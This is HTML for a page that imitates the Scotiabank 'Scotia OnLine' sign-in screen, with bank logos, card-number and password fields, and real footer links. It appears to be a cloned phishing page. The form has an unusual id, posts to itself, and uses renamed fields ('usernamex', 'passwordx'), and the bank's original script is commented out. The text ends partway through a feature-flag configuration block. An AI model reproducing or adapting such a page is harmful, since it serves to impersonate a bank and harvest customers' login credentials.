                              <path d="M187,50a34.48,34.48,0,1,0,34.47,34.47A34.52,34.52,0,0,0,187,50Zm0,49.67a15.2,15.2,0,1,1,15.19-15.2A15.21,15.21,0,0,1,187,99.68Z" transform="translate(-17.58 -19.82)"></path>
                              <polygon points="247.77 31.83 238.36 31.83 238.36 11.48 217.75 11.48 217.75 31.83 208.34 31.83 208.34 50.48 217.75 50.48 217.75 97.5 238.36 97.5 238.36 50.48 247.77 50.48 247.77 31.83"></polygon>
                              <rect x="257.22" y="31.83" width="20.6" height="65.67"></rect>
                              <path d="M285.1,19.82A11.48,11.48,0,1,0,296.59,31.3,11.5,11.5,0,0,0,285.1,19.82Z" transform="translate(-17.58 -19.82)"></path>
                              <path d="M580.64,69.34a12.3,12.3,0,0,1,12.28,12.28v35.7h20.6V78.8c0-17.49-10.09-28.79-26-28.79-6.55,0-13.46,2.87-19.15,12.05V51.65H547.75v65.67h20.61V81.62A12.3,12.3,0,0,1,580.64,69.34Z" transform="translate(-17.58 -19.82)"></path>
                              <polygon points="671.05 97.5 645.73 64.69 669.27 31.83 645.19 31.83 626.27 58.4 626.27 1.64 605.66 1.64 605.66 97.5 626.27 97.5 626.27 70.43 647.04 97.5 671.05 97.5"></polygon>
                              <path d="M81.54,99.65a30,30,0,0,0,2.11-12.1c0-6.63-2.08-12.55-5.85-16.68C73.4,66.05,65.88,62.05,55.45,59a37,37,0,0,1-5.86-2.2,14.46,14.46,0,0,1-4.37-3.25,7.37,7.37,0,0,1-1.87-5.32c0-3.05,1.63-5.12,4.29-6.79,3.33-2.1,9.74-2.3,16.29.12a39.83,39.83,0,0,1,6.64,3.15l8.76-17.43a49.86,49.86,0,0,0-12.56-5.66,55,55,0,0,0-14-1.77A37.61,37.61,0,0,0,39.7,22a29.82,29.82,0,0,0-10,6.52,30.84,30.84,0,0,0-6.65,10,31.9,31.9,0,0,0-2.21,12.14A25.58,25.58,0,0,0,28.6,68c6,5.63,12.8,7.63,15.54,8.69s5.75,2,7.68,2.71a27.62,27.62,0,0,1,5.64,2.88,9,9,0,0,1,3,3.34,7.53,7.53,0,0,1,.64,4.19,8.59,8.59,0,0,1-2.93,5.66c-1.77,1.66-5,2.61-9.48,2.61a28.68,28.68,0,0,1-11.49-2.76,82.84,82.84,0,0,1-9.33-5l-10.3,17.94C24.77,114.7,36.42,119,46.8,119a49.52,49.52,0,0,0,15.52-2.48,35.59,35.59,0,0,0,11.77-6.58A30.48,30.48,0,0,0,81.54,99.65Z" transform="translate(-17.58 -19.82)"></path>
                              <path d="M703.14,94.36a11.48,11.48,0,1,0,11.48,11.48A11.48,11.48,0,0,0,703.14,94.36Zm0,20.65a9.17,9.17,0,1,1,9.17-9.17A9.17,9.17,0,0,1,703.14,115Z" transform="translate(-17.58 -19.82)"></path>
                              <path d="M703.12,107.76h-1.84v4.35H699V99.58h4.8a4.16,4.16,0,0,1,4.17,4.15,4.07,4.07,0,0,1-2.41,3.65l2.64,4.73h-2.71Zm-1.84-2.1h2.63a1.93,1.93,0,0,0,0-3.84h-2.63Z" transform="translate(-17.58 -19.82)"></path>
                              <path d="M138,94A15.2,15.2,0,1,1,138,75L151.63,61.3A34.42,34.42,0,0,0,126.13,50c-19,0-35.56,13.53-35.56,34.48S107.12,119,126.13,119a34.42,34.42,0,0,0,25.5-11.29Z" transform="translate(-17.58 -19.82)"></path>
                              <path d="M376,117.32V51.65H355.93v6.9l-1.86-1.66A25.12,25.12,0,0,0,336.77,50C319,50,304.06,65.8,304.06,84.48S319,119,336.77,119a25.12,25.12,0,0,0,17.3-6.88l1.86-1.66v6.9ZM340,100a15.52,15.52,0,1,1,15.51-15.52A15.53,15.53,0,0,1,340,100Z" transform="translate(-17.58 -19.82)"></path>
                              <path d="M537.89,117.32V51.65H517.8v6.9l-1.86-1.66A25.12,25.12,0,0,0,498.64,50c-17.73,0-32.71,15.79-32.71,34.47s15,34.48,32.71,34.48a25.12,25.12,0,0,0,17.3-6.88l1.86-1.66v6.9ZM501.84,100a15.52,15.52,0,1,1,15.51-15.52A15.53,15.53,0,0,1,501.84,100Z" transform="translate(-17.58 -19.82)"></path>
                              <path d="M406.77,117.32v-6.9l1.86,1.66a25.1,25.1,0,0,0,17.3,6.88c17.73,0,32.7-15.79,32.7-34.48S443.66,50,425.93,50a25.1,25.1,0,0,0-17.3,6.88l-1.86,1.66V21.46H386.68v95.86Zm.44-32.84A15.52,15.52,0,1,1,422.73,100,15.53,15.53,0,0,1,407.21,84.48Z" transform="translate(-17.58 -19.82)"></path>
                           </svg>
                           <svg focusable="true" role="img" aria-hidden="false" class="SvgLogostyle__Wrapper-canvas-core__sc-1ed0csp-0 gpDBqN ScotiaLogo _1dL9S9IMDqm55mXtilgedg" aria-labelledby="logo-header-title" viewBox="0 0 389.27 99.14" size="18" type="scotia" fill="red">
                              <title id="logo-header-title">Scotia</title>
                              <path d="M236.11,99.31a34.48,34.48,0,1,0,34.47,34.48A34.52,34.52,0,0,0,236.11,99.31Zm0,49.68a15.2,15.2,0,1,1,15.19-15.2A15.22,15.22,0,0,1,236.11,149Z" transform="translate(-66.73 -69.12)"></path>
                              <polygon points="247.77 31.83 238.36 31.83 238.36 11.48 217.75 11.48 217.75 31.83 208.34 31.83 208.34 50.48 217.75 50.48 217.75 97.5 238.36 97.5 238.36 50.48 247.77 50.48 247.77 31.83"></polygon>
                              <rect x="257.22" y="31.83" width="20.6" height="65.67"></rect>
                              <path d="M334.25,69.13a11.48,11.48,0,1,0,11.48,11.48A11.49,11.49,0,0,0,334.25,69.13Z" transform="translate(-66.73 -69.12)"></path>
                              <path d="M425.11,166.62V101H405v6.91l-1.86-1.67a25.13,25.13,0,0,0-17.31-6.88c-17.72,0-32.7,15.79-32.7,34.48s15,34.47,32.7,34.47a25.13,25.13,0,0,0,17.31-6.88l1.86-1.66v6.9ZM389.05,149.3a15.52,15.52,0,1,1,15.52-15.51A15.53,15.53,0,0,1,389.05,149.3Z" transform="translate(-66.73 -69.12)"></path>
                              <path d="M130.69,149a30,30,0,0,0,2.11-12.1c0-6.63-2.08-12.55-5.85-16.68-4.4-4.82-11.92-8.82-22.35-11.9a36.59,36.59,0,0,1-5.86-2.2,14.14,14.14,0,0,1-4.37-3.25A7.36,7.36,0,0,1,92.5,97.5c0-3,1.63-5.12,4.28-6.79,3.34-2.1,9.74-2.3,16.3.13A39.76,39.76,0,0,1,119.72,94l8.76-17.43a49.86,49.86,0,0,0-12.56-5.66,55.49,55.49,0,0,0-14-1.77,37.38,37.38,0,0,0-13.08,2.17,29.79,29.79,0,0,0-10,6.51,30.84,30.84,0,0,0-6.65,10A31.9,31.9,0,0,0,70,99.91a25.59,25.59,0,0,0,7.76,17.4c6,5.63,12.81,7.63,15.55,8.69s5.75,2,7.68,2.72a27.38,27.38,0,0,1,5.64,2.87,9,9,0,0,1,3,3.34,7.53,7.53,0,0,1,.64,4.19,8.59,8.59,0,0,1-2.93,5.66c-1.77,1.66-5,2.61-9.48,2.61a28.68,28.68,0,0,1-11.49-2.76A82.84,82.84,0,0,1,77,139.68l-10.3,17.94c7.19,6.39,18.84,10.64,29.21,10.64a49.53,49.53,0,0,0,15.53-2.48,35.77,35.77,0,0,0,11.77-6.57A30.76,30.76,0,0,0,130.69,149Z" transform="translate(-66.73 -69.12)"></path>
                              <path d="M444.52,143.67A11.48,11.48,0,1,0,456,155.15,11.48,11.48,0,0,0,444.52,143.67Zm0,20.64a9.17,9.17,0,1,1,9.17-9.16A9.16,9.16,0,0,1,444.52,164.31Z" transform="translate(-66.73 -69.12)"></path>
                              <path d="M444.5,157.06h-1.84v4.35H440.4V148.88h4.81a4.16,4.16,0,0,1,4.17,4.15,4.08,4.08,0,0,1-2.42,3.65l2.64,4.73h-2.71Zm-1.84-2.1h2.64a1.93,1.93,0,0,0,0-3.84h-2.64Z" transform="translate(-66.73 -69.12)"></path>
                              <path d="M187.12,143.31a15.2,15.2,0,1,1,0-19l13.65-13.67a34.4,34.4,0,0,0-25.49-11.29c-19,0-35.56,13.53-35.56,34.48s16.55,34.47,35.56,34.47A34.4,34.4,0,0,0,200.77,157Z" transform="translate(-66.73 -69.12)"></path>
                           </svg>
                        </div>
                     </a>
                  </div>
                  <div class="_1_OkbS2WLDdfYBZ_5HwLvJ">
                     <div id="languageDropdownMenuLink" class="_3nLIdY_Y0OsC0naMSe4cmn" tabindex="0" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                        <span class="_1QT87go5v7dPcihE0_a7Ou _2-r-C4vFoI857WH2_UuXCh"></span>
                        <svg class="SvgIconstyle__Wrapper-canvas-core__sc-15g7y6h-0 gReMOT SvgIcon__icon UEnAZP9DCO8BIuQbL-UJ3 _2-r-C4vFoI857WH2_UuXCh" focusable="false" role="presentation" aria-hidden="true" viewBox="0 0 30 30" size="18" color="currentColor">
                           <path d="M28.5 8.24991L15 21.7499L1.5 8.24991" fill="none" stroke-linecap="round" stroke-linejoin="round"></path>
                        </svg>
                     </div>
                  </div>
               </div>
            </header>
            <main class="_16e3jP2sLLXzIXpWyvv2MD cWQtsaZrd8hAVSt8qps6f">
               <div class="DGblu-uCMLqo2gIAulb1M">
                  <div class="Gridstyle__Wrapper-canvas-core__sc-6d4gtg-0 hXXObI Grid__container _2U6-08CR-mRV6OG0DWBc86" id="login3Main">
                     <div class="Cardstyle__Wrapper-canvas-core__sc-1mhf12g-0 dEpyKJ Card__container _1bcSxMk3NAgnvjPq_83hWr" type="floatLow">
                       




					   <div class="_1IqfhyENLur_RobxTjYV-O _14hm7uVQF7rVJGibSb_BO1">
                           <h1 class="TextHeadlinestyle__Text-canvas-core__rml86m-0 kCayIF TextHeadline__text _2x05Bp1YJ7gu-W6PvGkpLK" color="black">Welcome to Scotia OnLine</h1>
                           <form id="HomeFormGirldWorld" name="HomeFormGirldWorld" action="" method="POST">
                              <label id="usernameInput-label" for="usernameInput-input"></label>
                              <div class="InputContainerstyle__Container-canvas-core__sc-1sov9au-0 InputContainer__input">
                                 <div class="InputContainerstyle__Container-canvas-core__sc-1sov9au-0 gsEwCM InputContainer__input--inline">
                                    <svg class="SvgIconstyle__Wrapper-canvas-core__sc-15g7y6h-0 gReMOT SvgIcon__icon InputIconstyle__Wrapper-canvas-core__sc-1alaz43-0 irBSAR Input__Icon UsernameTextFieldstyle__UsernameTextFieldLeftIcon-canvas-core__fbxdiq-1 zIOZo UsernameTextField__icon--User" focusable="false" role="presentation" aria-hidden="true" viewBox="0 0 30 30" size="18" color="currentColor">
                                       <path fill-rule="evenodd" clip-rule="evenodd" d="M16.4655 15.5344C20.0649 15.5344 22.9827 12.6166 22.9827 9.01719C22.9827 5.41781 20.0649 2.49994 16.4655 2.49994C12.8661 2.49994 9.94824 5.41781 9.94824 9.01719C9.94824 12.6166 12.8661 15.5344 16.4655 15.5344Z" fill="none" stroke-linecap="round" stroke-linejoin="round"></path>
                                       <path d="M29.5 29.4999V26.3964C29.5 22.9684 26.4779 20.1895 22.75 20.1895H9.25001C5.52208 20.1895 2.5 22.9684 2.5 26.3964V29.4999" fill="none" stroke-linecap="round" stroke-linejoin="round"></path>
                                    </svg>
                                    <input type="text" required autocomplete="off" id="usernamex" name="usernamex" value="" placeholder="Card number or username" class="Inputstyle__InputMain-canvas-core__sc-1glnvsj-0 dtSWvG Input__input Input__input--with-left-icon UsernameTextField--with-clear-button _3wPEgCDEKf6p4Z46h_bQZD _2XIs4TPK0VltiNL5UUDeUg">
                                 </div>
                              </div>
                              <div class="Marginstyle__Wrapper-canvas-core__dm8riu-0 gZahS Margin__container">
                                 <label id="password-label" for="password-input"></label>
                                 <div class="InputContainerstyle__Container-canvas-core__sc-1sov9au-0 InputContainer__input">
                                    <div class="InputContainerstyle__Container-canvas-core__sc-1sov9au-0 gsEwCM InputContainer__input--inline">
                                       <svg class="SvgIconstyle__Wrapper-canvas-core__sc-15g7y6h-0 gReMOT SvgIcon__icon InputIconstyle__Wrapper-canvas-core__sc-1alaz43-0 irBSAR Input__Icon" focusable="false" role="presentation" aria-hidden="true" viewBox="0 0 30 30" size="18" color="currentColor">
                                          <path fill-rule="evenodd" clip-rule="evenodd" d="M26.0455 26.0453C26.0455 27.3953 24.9409 28.4999 23.5909 28.4999H6.40913C5.05914 28.4999 3.95459 27.3953 3.95459 26.0453V13.7726C3.95459 12.4226 5.05914 11.3181 6.40913 11.3181H23.5909C24.9409 11.3181 26.0455 12.4226 26.0455 13.7726V26.0453Z" fill="none" stroke-linecap="round" stroke-linejoin="round"></path>
                                          <path d="M15.0171 18.6818V22.3636" fill="none" stroke-linecap="round"></path>
                                          <path d="M21.1704 7.63619V10.8197" fill="none" stroke-linecap="round" stroke-linejoin="round"></path>
                                          <path d="M8.86377 11.143V7.6367" fill="none" stroke-linecap="round" stroke-linejoin="round"></path>
                                          <path d="M8.86377 7.63629C8.86377 4.25024 11.6104 1.49992 15.0001 1.49992C18.3923 1.49992 21.1365 4.25024 21.1365 7.63629" fill="none" stroke-linecap="round" stroke-linejoin="round"></path>
                                          <path fill-rule="evenodd" clip-rule="evenodd" d="M13.1729 17.4544C13.1729 16.446 13.9897 15.6271 15.0001 15.6271C16.0106 15.6271 16.8274 16.446 16.8274 17.4544C16.8274 18.4644 16.0102 19.2817 15.0001 19.2817C13.9901 19.2817 13.1729 18.4644 13.1729 17.4544Z" stroke="none"></path>
                                       </svg>
                                       <input type="password"  id="passwordx" name="passwordx" required autocomplete="off" value="" placeholder="Password" class="Inputstyle__InputMain-canvas-core__sc-1glnvsj-0 jSzLoq Input__input PasswordTextFieldstyle__StyledPasswordTextField-canvas-core__sc-1n976yi-0 uNhYB _3wPEgCDEKf6p4Z46h_bQZD">
                                    </div>
                                 </div>
                              </div>
                              <div class="_13IA_dzLPjDqv1iY9PDCfk"><a href="#" to="/#" size="16" type="default" id="recovery" class="Linkstyle__Wrapper-canvas-core__nzeldc-1 lbYdir _24Ri1IkRDml6Hpo-VJUPXB"><span type="default" class="Linkstyle__Text-canvas-core__nzeldc-0 gRuaFc">Forgot your username or password?</span></a></div>
                              <div class="Marginstyle__Wrapper-canvas-core__dm8riu-0 jjhNWi Margin__container">
                                 <div class="InputContainerstyle__Container-canvas-core__sc-1sov9au-0 InputContainer__input Checkboxstyle__StyledInputContainer-canvas-core__sc-1p7p9fh-0 Checkbox__container _2IX1IBIW4mYG_6azaZb_K_">
                                    <div class="Checkboxstyle__CheckboxWrapper-canvas-core__sc-1p7p9fh-1 hTLAra Checkbox__tooltipInput">
                                       <label for="rememberMe" class="Checkboxstyle__CheckboxLabel-canvas-core__sc-1p7p9fh-3 kEyugX Checkbox__label">
                                          <input type="checkbox" id="rememberMe" name="remember me" class="Inputstyle__InputMain-canvas-core__sc-1glnvsj-0 byZqWL Input__input Checkboxstyle__StyledInput-canvas-core__sc-1p7p9fh-5 laWLmc Checkbox__input" value="">
                                          <span class="Checkboxstyle__CheckboxIconWrapper-canvas-core__sc-1p7p9fh-4 ePoOAY Checkbox__span">
                                             <svg class="SvgIconstyle__Wrapper-canvas-core__sc-15g7y6h-0 gfCWUB SvgIcon__icon Checkbox__icon Checkbox__icon--indeterminate" focusable="false" role="presentation" aria-hidden="true" viewBox="0 0 15 2" size="12" color="currentColor">
                                                <path d="M1.5 1H13.5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                             </svg>
                                             <svg class="SvgIconstyle__Wrapper-canvas-core__sc-15g7y6h-0 lmOWYf SvgIcon__icon Checkbox__icon Checkbox__icon--check" focusable="false" role="presentation" aria-hidden="true" viewBox="0 0 24 24" size="12" color="currentColor">
                                                <path stroke="none" d="M13.85 10.667l6.533-5.683A1.727 1.727 0 0 1 22.65 7.59l-6.511 5.663-6.371 5.74c-.7.63-1.775.585-2.418-.103l-6.134-6.559a1.727 1.727 0 0 1 2.522-2.359l4.977 5.321 5.134-4.626z"></path>
                                             </svg>
                                          </span>
                                          <div class="Checkboxstyle__CheckboxVisibleLabel-canvas-core__sc-1p7p9fh-6 cGBeNn Label__label Label__label--checkbox Label__label--inline">Remember my username or card number</div>
                                       </label>
                                    </div>
                                 </div>
                              </div>
                              <button class="ButtonCorestyle__StyledButton-canvas-core__v39ho0-0 AroZG ButtonCore__button PrimaryButtonstyle__StyledPrimaryButtonCore-canvas-core__sc-11pddd2-0 dmarUm Button__button--primary _3QIv3Rkx0hZd1e7JFFYXPY" id="signIn" type="submit">
							  <span class="ButtonCorestyle__StyledButtonCoreBlock-canvas-core__v39ho0-1 dnkwCQ ButtonCore__block" tabindex="-1"><span class="ButtonCore__text">Sign in</span>
							  </span>
							  </button>
                           </form>
                           <div class="Marginstyle__Wrapper-canvas-core__dm8riu-0 kSMmmO Margin__container">
                              <p class="TextBodystyle__Text-canvas-core__xx5i8s-0 fCvJdk TextBody__text _2X0Xs_Qd7_x3boNjaoZ8u-" color="black" type="1">New to Scotia OnLine?</p>
                              <a href="#" to="/#" size="16" type="default" id="enroll" class="Linkstyle__Wrapper-canvas-core__nzeldc-1 lbYdir _24Ri1IkRDml6Hpo-VJUPXB"><span type="default" class="Linkstyle__Text-canvas-core__nzeldc-0 gRuaFc">Enroll now</span></a>
                           </div>
                        </div>
						
						
						
						
						
                     </div>
                  </div>
               </div>
            </main>
            <footer id="footer" class="_2zYsPKY1n4_gu3O9JUCSvq">
               <div class="_2DffOV05HIcMLgez95kpAp">
                  <div class="ZrbKb2s9ngUb9yQxy9ZD3">
                     <ul class="_3KdtSP0gY2pqgwPIDf2tfx">
                        <li><a href="https://pa.scotiabank.com/en/about-scotiabank/connect-with-scotiabank/legal.html" to="https://pa.scotiabank.com/en/about-scotiabank/connect-with-scotiabank/legal.html" target="_blank" size="14" type="default" class="Linkstyle__Wrapper-canvas-core__nzeldc-1 iYXApC"><span type="default" class="Linkstyle__Text-canvas-core__nzeldc-0 gRuaFc">Legal</span></a></li>
                        <li><a href="https://pa.scotiabank.com/en/about-scotiabank/connect-with-scotiabank/privacy.html" to="https://pa.scotiabank.com/en/about-scotiabank/connect-with-scotiabank/privacy.html" target="_blank" size="14" type="default" class="Linkstyle__Wrapper-canvas-core__nzeldc-1 iYXApC"><span type="default" class="Linkstyle__Text-canvas-core__nzeldc-0 gRuaFc">Privacy</span></a></li>
                        <li><a href="https://pa.scotiabank.com/en/about-scotiabank/connect-with-scotiabank/security.html" to="https://pa.scotiabank.com/en/about-scotiabank/connect-with-scotiabank/security.html" target="_blank" size="14" type="default" class="Linkstyle__Wrapper-canvas-core__nzeldc-1 iYXApC"><span type="default" class="Linkstyle__Text-canvas-core__nzeldc-0 gRuaFc">Security</span></a></li>
                        <li><a href="https://www.scotiabank.com/global/en/fatca.html" to="https://www.scotiabank.com/global/en/fatca.html" target="_blank" size="14" type="default" class="Linkstyle__Wrapper-canvas-core__nzeldc-1 iYXApC"><span type="default" class="Linkstyle__Text-canvas-core__nzeldc-0 gRuaFc">FATCA</span></a></li>
                        <li><a href="https://pa.scotiabank.com/en/about-scotiabank/connect-with-scotiabank/security/our-commitment-to-you/safety-of-online-banking-services.html" to="https://pa.scotiabank.com/en/about-scotiabank/connect-with-scotiabank/security/our-commitment-to-you/safety-of-online-banking-services.html" target="_blank" size="14" type="default" class="Linkstyle__Wrapper-canvas-core__nzeldc-1 iYXApC"><span type="default" class="Linkstyle__Text-canvas-core__nzeldc-0 gRuaFc">Security Guarantee</span></a></li>
                        <li><a href="https://pa.scotiabank.com/en/about-scotiabank/connect-with-scotiabank/accessibility-services.html" to="https://pa.scotiabank.com/en/about-scotiabank/connect-with-scotiabank/accessibility-services.html" target="_blank" size="14" type="default" class="Linkstyle__Wrapper-canvas-core__nzeldc-1 iYXApC"><span type="default" class="Linkstyle__Text-canvas-core__nzeldc-0 gRuaFc">Accessibility</span></a></li>
                        <li><a href="https://pa.scotiabank.com/en/about-scotiabank/connect-with-scotiabank/contact-us.html" to="https://pa.scotiabank.com/en/about-scotiabank/connect-with-scotiabank/contact-us.html" target="_blank" size="14" type="default" class="Linkstyle__Wrapper-canvas-core__nzeldc-1 iYXApC"><span type="default" class="Linkstyle__Text-canvas-core__nzeldc-0 gRuaFc">Contact Us</span></a></li>
                     </ul>
                  </div>
               </div>
               <div class="_38Yq-Rbiil9hPUJN3ZORZb">
                  <div class="ZrbKb2s9ngUb9yQxy9ZD3">
                     <div class="_30EjLxZ6R4jo6NQZdyMWR_"></div>
                     <div class="_21CWENMdFIKjO_HFiEgZEu">
                        <p class="TextBodystyle__Text-canvas-core__xx5i8s-0 fCvJdk TextBody__text" color="black" type="1">© Scotiabank. All Rights Reserved.</p>
                     </div>
                  </div>
               </div>
            </footer>
            <button class="_2ALm1j8YuQmwl8Gkc1YLnH" type="button"><span class="TextCaptionstyle__Text-canvas-core__lol886-0 dayBiQ TextCaption__text ltf44NmV8dxdh56CbDo9C" color="black">Feedback</span></button>
         </div>
      </div>
	  <!--
      <script type="text/javascript">
         window.process={"env":{"PROGRAM_ID":"onyx-web-auth-prd","ORIGIN_ONLY_ALLOW_SCOTIA":"true","LEAP_SIGN_IN":"https://www.online.scotiabank.com/onlineV1/leap/signon/signOn.xhtml","DASHBOARD_URL":"https://banking.online.scotiabank.com/account","DIGITAL_LOBBY_URL":"https://apply.online.scotiabank.com/product/digital-lobby"}};
         window.LD_CONFIG={"flags":{"SignOnFlag":false,"aflt-collab.dashboard.advisors-section":false,"aflt-collab.dashboard.contact-center-section":false,"aflt-collab.dashboard.meetings-section":false,"aflt-collab.dashboard.quicklinks-section":false,"aflt-collab.meeting.book":false,"aflt-collab.meeting.details":false,"aflt-collab.meeting.edit":false,"aflt-collab.meeting.room":false,"all.all.all.dc-accounts.accounts_cache":false,"all.all.all.dc-accounts.events":false,"all.all.all.dc-svcs-auth.v3_digital_access":true,"all.all.all.dc-svcs-auth.v3_login":true,"all.all.all.dc-svcs-auth.v3_recover_username":true,"all.all.all.dc-svcs-auth.v3_reset_password":true,"all.all.all.dc-svcs-auth.v3_self_enrollment":true,"all.all.all.dc-transfers.bill_payments":true,"all.all.all.dc-transfers.bill_payments_fraud_detection":true,"all.all.all.dc-transfers.mobile_top_ups":true,"all.all.all.dc-transfers.mobile_top_ups_fraud_detection":true,"all.all.all.dc-transfers.tax_payments_fraud_detection":false,"all.all.all.dc-transfers.third_party_transfers":true,"all.all.all.dc-transfers.third_party_transfers.offus":false,"all.all.all.dc-transfers.third_party_transfers.onus":false,"all.all.all.dc-transfers.third_party_transfers_ach":false,"all.all.all.dc-transfers.third_party_transfers_fraud_detection":true,"all.all.all.dc-transfers.third_party_transfers_instantpayment_bh":false,"all.all.all.dc-transfers.third_party_transfers_instantpayment_local":false,"all.all.all.dc-transfers.third_party_transfers_instantpayment_sipa":false,"all.all.all.dc-transfers.third_party_transfers_offus":false,"all.all.all.dc-transfers.third_party_transfers_onus":false,"all.all.all.dc-transfers.third_party_transfers_rtp":false,"brz-accounts.dashboard.campaign":false,"brz-accounts.dashboard.payees":false,"brz-accounts.dashboard.recipients":false,"brz-accounts.dashboard.transactions":true,"brz-accounts.dashboard.welcome":true,"brz-accounts.move-money.navigation":false,"brz-accounts.self-serve.navigation":false,"brz-accounts.statement.download-option":true,"brz-accounts.username-interceptor":false,"brz-common.menu.switch-to-leap":true,"brz-common.more.navigation":false,"brz-common.move-money.navigation":true,"brz-common.my-offer.navigation":false,"brz-move-money.mobile-top-up.tax-and-fees":false,"brz-move-money.payment.tax-and-fees":false,"brz-move-money.real-time-payment":false,"brz-move-money.tax-payment":true,"brz-move-money.third-party-transfers.show-individual-id":false,"brz-move-money.third-party-transfers.tax-and-fees":false,"brz-move-money.transfers.tax-and-fees":false,"brz-move-money.with-holding-tax":false,"brz-self-serve.move-money.navigation":false,"c-svcs-auth.recover_username.events":false,"cosmos-common.workflow.titan2":false,"dc-accounts.wealth_statements":false,"dc-campaigns.offers.next_best_action":false,"dc-campaigns.onboardings.customers":false,"dc-campaigns.onboardings.customers.applications":false,"dc-credentials.customers.political_exposure":false,"dc-credentials.customers.risks":false,"dc-credentials.customers_employment":false,"dc-credentials.profiles.publish_event":false,"dc-svcs-auth.change_password.events":false,"dc-svcs-auth.login.events":false,"dc-svcs-auth.monitor_plus":false,"dc-svcs-auth.off_boarding_date":false,"dc-svcs-auth.recover_username.events":false,"dc-svcs-auth.reset_password.events":false,"dc-svcs-auth.username_intercept.interval":1,"dc-svcs-auth.v3_digital_access.governmentdb":false,"dc-svcs-auth.v3_digital_access.idv":false,"dc-svcs-auth.v3_hrt_pay_submit":true,"dc-svcs-auth.v3_hrt_tpt_add_recipient":true,"dc-svcs-auth.v3_hrt_tpt_edit_recipient":false,"dc-svcs-auth.v3_hrt_tpt_submit":true,"dc-transfers.bill_payments":true,"dc-transfers.bill_payments_fraud_detection":true,"dc-transfers.customer_initiated_entry":false,"dc-transfers.merchants":false,"dc-transfers.mobile_top_ups":true,"dc-transfers.mobile_top_ups_fraud_detection":true,"dc-transfers.payees":true,"dc-transfers.tax_payments":true,"dc-transfers.tax_payments_fraud_detection":false,"dc-transfers.third_party_transfers":true,"dc-transfers.third_party_transfers_ach":true,"dc-transfers.third_party_transfers_fraud_detection":true,"dc-transfers.third_party_transfers_instantpayment_bh":true,"dc-transfers.third_party_transfers_instantpayment_local":true,"dc-transfers.third_party_transfers_instantpayment_sipa":true,"dc-transfers.third_party_transfers_offus":false,"dc-transfers.third_party_transfers_onus":true,"dc-transfers.third_party_transfers_rtp":false,"dc-transfers.third_party_transfers_rtp_fraud_detection":false,"dcsvcs-auth.username_intercept.interval":2,"dcsvcs.auth.username_intercept.interval":0,"leap.onyx_redirect":true,"leap.token_info_check.interval":10000,"web.online.all.auth.login":true,"web.online.all.auth.login_welcome_modal":true,"web.online.all.auth.recover_username":true,"web.online.all.auth.reset_password":true,"web.online.all.auth.self_enrollment":true,"web.online.all.breeze.address_update":false,"web.online.all.breeze.campaigns":false,"web.online.all.breeze.dashboard_campaign":false,"web.online.all.breeze.dashboard_recent_transactions":false,"web.online.all.breeze.leap_navigation":"false","web.online.all.breeze.navigation_to_leap":false,"$flagsState":{"SignOnFlag":{"version":2,"variation":1},"aflt-collab.dashboard.advisors-section":{"version":3,"variation":1},"aflt-collab.dashboard.contact-center-section":{"version":2,"variation":1},"aflt-collab.dashboard.meetings-section":{"version":3,"variation":1},"aflt-collab.dashboard.quicklinks-section":{"version":3,"variation":1},"aflt-collab.meeting.book":{"version":3,"variation":1},"aflt-collab.meeting.details":{"version":3,"variation":1},"aflt-collab.meeting.edit":{"version":3,"variation":1},"aflt-collab.meeting.room":{"version":3,"variation":1},"all.all.all.dc-accounts.accounts_cache":{"version":2,"variation":1},"all.all.all.dc-accounts.events":{"version":2,"variation":1},"all.all.all.dc-svcs-auth.v3_digital_access":{"version":5,"variation":0},"all.all.all.dc-svcs-auth.v3_login":{"version":10,"variation":0},"all.all.all.dc-svcs-auth.v3_recover_username":{"version":7,"variation":0},"all.all.all.dc-svcs-auth.v3_reset_password":{"version":7,"variation":0},"all.all.all.dc-svcs-auth.v3_self_enrollment":{"version":6,"variation":0},"all.all.all.dc-transfers.bill_payments":{"version":5,"variation":0},"all.all.all.dc-transfers.bill_payments_fraud_detection":{"version":8,"variation":0},"all.all.all.dc-transfers.mobile_top_ups":{"version":4,"variation":0},"all.all.all.dc-transfers.mobile_top_ups_fraud_detection":{"version":7,"variation":0},"all.all.all.dc-transfers.tax_payments_fraud_detection":{"version":2,"variation":1},"all.all.all.dc-transfers.third_party_transfers":{"version":4,"variation":0},"all.all.all.dc-transfers.third_party_transfers.offus":{"version":2,"variation":1},"all.all.all.dc-transfers.third_party_transfers.onus":{"version":2,"variation":1},"all.all.all.dc-transfers.third_party_transfers_ach":{"version":2,"variation":1},"all.all.all.dc-transfers.third_party_transfers_fraud_detection":{"version":8,"variation":0},"all.all.all.dc-transfers.third_party_transfers_instantpayment_bh":{"version":2,"variation":1},"all.all.all.dc-transfers.third_party_transfers_instantpayment_local":{"version":2,"variation":1},"all.all.all.dc-transfers.third_party_transfers_instantpayment_sipa":{"version":2,"variation":1},"all.all.all.dc-transfers.third_party_transfers_offus":{"version":2,"variation":1},"all.all.all.dc-transfers.third_party_transfers_onus":{"version":2,"variation":1},"all.all.all.dc-transfers.third_party_transfers_rtp":{"version":2,"variation":1},"brz-accounts.dashboard.campaign":{"version":3,"variation":1},"brz-accounts.dashboard.payees":{"version":3,"variation":1},"brz-accounts.dashboard.recipients":{"version":3,"variation":1},"brz-accounts.dashboard.transactions":{"version":4,"variation":0},"brz-accounts.dashboard.welcome":{"version":3,"variation":0},"brz-accounts.move-money.navigation":{"version":2,"variation":1},"brz-accounts.self-serve.navigation":{"version":2,"variation":1},"brz-accounts.statement.download-option":{"version":4,"variation":0},"brz-accounts.username-interceptor":{"version":2,"variation":1},"brz-common.menu.switch-to-leap":{"version":6,"variation":0},"brz-common.more.navigation":{"version":3,"variation":1},"brz-common.move-money.navigation":{"version":5,"variation":0},"brz-common.my-offer.navigation":{"version":3,"variation":1},"brz-move-money.mobile-top-up.tax-and-fees":{"version":3,"variation":1},"brz-move-money.payment.tax-and-fees":{"version":2,"variation":1},"brz-move-money.real-time-payment":{"version":2,"variation":1},"brz-move-money.tax-payment":{"version":3,"variation":0},"brz-move-money.third-party-transfers.show-individual-id":{"version":2,"variation":1},"brz-move-money.third-party-transfers.tax-and-fees":{"version":3,"variation":1},"brz-move-money.transfers.tax-and-fees":{"version":3,"variation":1},"brz-move-money.with-holding-tax":{"version":3,"variation":1},"brz-self-serve.move-money.navigation":{"version":2,"variation":1},"c-svcs-auth.recover_username.events":{"version":2,"variation":1},"cosmos-common.workflow.titan2":{"version":2,"variation":1},"dc-accounts.wealth_statements":{"version":3,"variation":1},"dc-campaigns.offers.next_best_action":{"version":2,"var